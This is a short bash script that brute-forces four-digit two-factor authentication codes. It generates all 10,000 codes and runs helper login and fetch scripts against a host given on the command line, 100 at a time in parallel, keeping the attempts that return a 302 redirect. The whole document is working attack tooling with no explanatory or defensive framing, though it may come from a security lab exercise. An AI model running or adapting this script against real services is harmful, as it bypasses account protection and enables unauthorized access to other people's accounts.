#!/bin/bash

# Function to parallize curl requests to brute force 2fa
# Only works on 4 digits - don't wanna bother with more than that.
if [ -z ${1+x} ]; then
    echo "Expecting first argument to be the host endpoint"
    exit 255
else
    host=$1
fi

COOKIE_DIR=/tmp/bf_cookies
rm -r $COOKIE_DIR 2> /dev/null
mkdir -p $COOKIE_DIR

# Customize the `-w format output and egrep below`
# Ref: https://everything.curl.dev/usingcurl/verbose/writeout
printf '%04i\n' {0..9999} | xargs -n20 -P100 -I@ \
    sh -c "./brute_force_2fa_login.sh @ $host $COOKIE_DIR && \
    ./brute_force_2fa_get.sh @ $host $COOKIE_DIR" | grep -E "^302:"

# rm -r $COOKIE_DIR
